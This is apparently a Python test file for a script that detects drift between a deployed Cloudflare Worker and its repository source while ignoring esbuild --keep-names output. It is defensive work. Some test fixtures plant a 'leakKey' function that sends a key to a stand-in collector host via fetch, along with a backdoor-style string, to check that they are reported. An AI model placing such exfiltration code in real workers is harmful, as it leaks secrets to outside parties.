"""Worker drift comparison in tools/recover_live_worker.sh must not cry wolf on wrangler's
esbuild output, and must still report real hand-deployed additions.

Found 2026-10-17: relayshield-order-screening reported THEY DIFFER with 2 live-only
identifiers (configurable, target) and 47 live-only strings, every one esbuild's
--keep-names helper. The embedded Python is pulled out of the shell script and run, so
the test executes the comparison that actually ships rather than a copy of it.

The LIVE fixture is real `esbuild --bundle --format=esm --keep-names` output (all three
__name shapes: statement, expression-wrapped, and class `this`), wrapped the way the
Workers API returns it (multipart boundary, content headers, sourceMappingURL).
"""
import os
import re
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPT = os.path.join(HERE, "tools", "recover_live_worker.sh")

REPO_SRC = r'''// A comment that esbuild strips.
const PREFIX = "shop:";
const shopKey = (shop) => `${PREFIX}${shop}`;
async function hmacSha256(secret, data) {
  const k = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  return new Uint8Array(await crypto.subtle.sign("HMAC", k, new TextEncoder().encode(data)));
}
class Screener {
  check(email) { return email.endsWith("@example.test") ? "high" : "unknown"; }
}
export default {
  async fetch(request) {
    const url = new URL(request.url);
    if (url.pathname === "/health") return new Response("ok");
    await hmacSha256("a", "b");
    return new Response(shopKey(new Screener().check("x@y.z")));
  },
};
'''

LIVE_BUNDLE = r'''var __defProp = Object.defineProperty;
var __name = (target, value) => __defProp(target, "name", { value, configurable: true });

// sub/worker.js
var PREFIX = "shop:";
var shopKey = /* @__PURE__ */ __name((shop) => `${PREFIX}${shop}`, "shopKey");
async function hmacSha256(secret, data) {
  const k = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  return new Uint8Array(await crypto.subtle.sign("HMAC", k, new TextEncoder().encode(data)));
}
__name(hmacSha256, "hmacSha256");
var Screener = class {
  static {
    __name(this, "Screener");
  }
  check(email) {
    return email.endsWith("@example.test") ? "high" : "unknown";
  }
};
var worker_default = {
  async fetch(request) {
    const url = new URL(request.url);
    if (url.pathname === "/health") return new Response("ok");
    await hmacSha256("a", "b");
    return new Response(shopKey(new Screener().check("x@y.z")));
  }
};
export {
  worker_default as default
};
'''


def embedded_python():
    with open(SCRIPT, encoding="utf-8") as fh:
        text = fh.read()
    m = re.search(r"python3 - \"\$REPO_FILE\" \"\$OUT\" <<'PYEOF'\n(.*?)\nPYEOF", text, re.S)
    assert m, "comparison block not found in recover_live_worker.sh"
    return m.group(1)


def multipart(bundle):
    return ("------formdata-undici-0123456789abcdef\r\n"
            'Content-Disposition: form-data; name="worker.js"; filename="worker.js"\r\n'
            "Content-Type: application/javascript+module\r\n\r\n"
            + bundle +
            "\n//# sourceMappingURL=worker.js.map\r\n"
            "------formdata-undici-0123456789abcdef--\r\n")


def compare(repo_src, live_bundle):
    with tempfile.TemporaryDirectory() as d:
        repo = os.path.join(d, "worker.js")
        live = os.path.join(d, "live-worker-x.js")
        prog = os.path.join(d, "cmp_prog.py")
        for path, body in ((repo, repo_src), (live, multipart(live_bundle)), (prog, embedded_python())):
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(body)
        r = subprocess.run([sys.executable, "-I", prog, repo, live],
                           capture_output=True, text=True, cwd=d)
        assert r.returncode == 0, r.stderr
        return r.stdout


def counts(out):
    ids = int(re.search(r"identifiers in LIVE and not in the repo : (\d+)", out).group(1))
    strs = int(re.search(r"string literals in LIVE and not in the repo : (\d+)", out).group(1))
    return ids, strs


class KeepNames(unittest.TestCase):
    def test_a_clean_keep_names_bundle_reports_nothing(self):
        out = compare(REPO_SRC, LIVE_BUNDLE)
        self.assertEqual(counts(out), (0, 0), out)
        self.assertIn("NOTHING IS DEPLOYED THAT THE REPO DOES NOT HAVE", out)

    def test_the_fixture_really_contains_all_three_shapes(self):
        # If esbuild output is ever re-pasted without them, the clean test above proves nothing.
        self.assertRegex(LIVE_BUNDLE, r'(?m)^__name\(hmacSha256, "hmacSha256"\);$')
        self.assertIn('/* @__PURE__ */ __name((shop) =>', LIVE_BUNDLE)
        self.assertIn('__name(this, "Screener")', LIVE_BUNDLE)
        self.assertIn("var __defProp = Object.defineProperty;", LIVE_BUNDLE)

    def test_a_hand_added_function_and_url_is_still_reported(self):
        live = LIVE_BUNDLE.replace(
            "var worker_default",
            'async function leakKey(k) { await fetch("https://collector.invalid/leak?k=" + k); }\n'
            '__name(leakKey, "leakKey");\nvar worker_default')
        out = compare(REPO_SRC, live)
        ids, strs = counts(out)
        self.assertGreaterEqual(ids, 1, out)
        self.assertGreaterEqual(strs, 1, out)
        self.assertIn("leakKey", out)
        self.assertIn("collector.invalid", out)

    def test_a_string_right_beside_a_name_call_is_still_reported(self):
        live = LIVE_BUNDLE.replace(
            '__name(hmacSha256, "hmacSha256");',
            '__name(hmacSha256, "hmacSha256"); var sneaky = "backdoor-path-zzz";')
        out = compare(REPO_SRC, live)
        self.assertIn("backdoor-path-zzz", out)

    def test_a_name_argument_that_is_not_a_plain_identifier_is_not_hidden(self):
        live = LIVE_BUNDLE.replace(
            '__name(hmacSha256, "hmacSha256");',
            '__name(hmacSha256, "hmacSha256 injected note");')
        out = compare(REPO_SRC, live)
        self.assertIn("hmacSha256 injected note", out)

    def test_a_template_literal_with_a_nested_call_is_scanned_correctly(self):
        # The scanner must honour ${...} and quotes, or it cuts the wrong span.
        src = REPO_SRC + "\nconst tpl = (a) => `x${a}`;\n"
        live = LIVE_BUNDLE.replace(
            "var worker_default",
            'var tpl = /* @__PURE__ */ __name((a) => `x${a + ")" + \'("\'}`, "tpl");\nvar worker_default')
        out = compare(src, live)
        # `a`, `tpl` fine; the only legitimate noise is the extra literal pieces.
        self.assertNotIn("tpl", out.split("identifiers in LIVE")[1].split("string literals")[0])


# The three extractor weaknesses found by bundling every Worker in the repo (2026-10-18).
# Each pair is (source, what esbuild --keep-names makes of it), written by hand from real
# esbuild behaviour, so these run without esbuild installed.
def reported(src_body, live_body):
    out = compare(src_body, LIVE_PREFIX + live_body)
    return counts(out), out


LIVE_PREFIX = (
    "var __defProp = Object.defineProperty;\n"
    "var __name = (target, value) => __defProp(target, \"name\", { value, configurable: true });\n"
    "\n// worker.js\n")


class Extractor(unittest.TestCase):
    def test_short_strings_do_not_put_quote_pairing_out_of_step(self):
        src = 'const k = [ "raw", enc(secret), { name: "HMAC", hash: "SHA-256" }, ["sign"] ];\n'
        live = 'var k = [\n  "raw",\n  enc(secret),\n  { name: "HMAC", hash: "SHA-256" },\n  ["sign"]\n];\n'
        self.assertEqual(reported(src, live)[0], (0, 0))

    def test_apostrophes_in_comments_and_regex_literals_are_not_strings(self):
        src = ("// it doesn't matter, this comment opens no string\n"
               "const esc = (s) => s.replace(/'/g, \"&#39;\").replace(/\"/g, \"&quot;\");\n"
               "const label = 'something that is long enough';\n")
        live = ("var esc = /* @__PURE__ */ __name((s) => s.replace(/'/g, \"&#39;\").replace(/\"/g, \"&quot;\"), \"esc\");\n"
                "var label = \"something that is long enough\";\n")
        self.assertEqual(reported(src, live)[0], (0, 0))

    def test_division_after_a_word_is_not_a_regex_start(self):
        # Mistaken for a regex, `/ 2 + "..." + total /` swallows the string between the slashes.
        src = 'const x = total / 2 + "a string of some length" + total / 3;\n'
        # The bundle lays the same expression out over two lines, so a wrong guess that
        # swallows the string in one copy would not be matched by the same guess in the other.
        live = 'var x = total / 2 +\n  "a string of some length" + total / 3;\n'
        self.assertEqual(reported(src, live)[0], (0, 0))

    def test_text_quoted_inside_a_source_comment_does_not_vouch_for_live_code(self):
        # The bundle has no comments, so a string that exists in the LIVE script only
        # because somebody added it must not be excused by the same words appearing
        # in a comment of the repo copy.
        src = '// the old endpoint "https://old.invalid/collect" was removed\nconst a = 1234;\n'
        live = 'var a = 1234;\nawait fetch("https://old.invalid/collect");\n'
        self.assertEqual(reported(src, live)[0][1], 1)

    def test_requoted_strings_compare_by_value(self):
        src = "const m = 'say \"hi\" \u2190 now';\nconst n = \"it\\'s fine here\";\n"
        live = 'var m = "say \\"hi\\" \\u2190 now";\nvar n = "it\'s fine here";\n'
        self.assertEqual(reported(src, live)[0], (0, 0))

    def test_folded_concatenation_is_known_however_long_the_chain(self):
        parts = ["line number %d of a long message. " % i for i in range(15)]
        src = "const msg =\n" + " +\n".join('  "%s"' % p for p in parts) + ";\n"
        live = 'var msg = "' + "".join(parts) + '";\n'
        self.assertEqual(reported(src, live)[0], (0, 0))

    def test_strings_that_merely_sit_next_to_each_other_are_not_vouched_for(self):
        # Adjacent but NOT joined by `+`: a live string equal to their concatenation is new.
        src = 'f("first string here", "second string here");\n'
        live = 'f("first string here", "second string here");\nvar x = "first string heresecond string here";\n'
        ids, strs = reported(src, live)[0]
        self.assertEqual(strs, 1)

    def test_unicode_escapes_do_not_leak_into_identifiers(self):
        src = 'const a = "\u2190 arrow";\nconst b = "\U0001F600 face";\n'
        live = 'var a = "\\u2190 arrow";\nvar b = "\\ud83d\\ude00 face";\n'
        self.assertEqual(reported(src, live)[0], (0, 0))

    def test_unicode_escape_glued_to_text_does_not_leak_into_identifiers(self):
        # \\u30C8abcdef, as esbuild writes it, reads as the identifier `u30C8abcdef`.
        src = 'const a = "\u30C8abcdef ghij";\n'
        live = 'var a = "\\u30C8abcdef ghij";\n'
        self.assertEqual(reported(src, live)[0], (0, 0))

    def test_newline_escapes_do_not_leak_into_identifiers(self):
        src = 'const t = "first line\\n\\n" + "It continues here";\n'
        live = 'var t = "first line\\n\\nIt continues here";\n'
        self.assertEqual(reported(src, live)[0], (0, 0))


class TheScriptItself(unittest.TestCase):
    def test_the_script_still_parses(self):
        r = subprocess.run(["sh", "-n", SCRIPT], capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)

    def test_the_banner_regex_handles_a_path_with_a_directory(self):
        # `// shopify/worker.js` was not matched by a basename-only pattern.
        live = LIVE_BUNDLE.replace("// sub/worker.js", "// some/deep/dir/worker.js")
        self.assertEqual(counts(compare(REPO_SRC, live)), (0, 0))


if __name__ == "__main__":
    unittest.main()
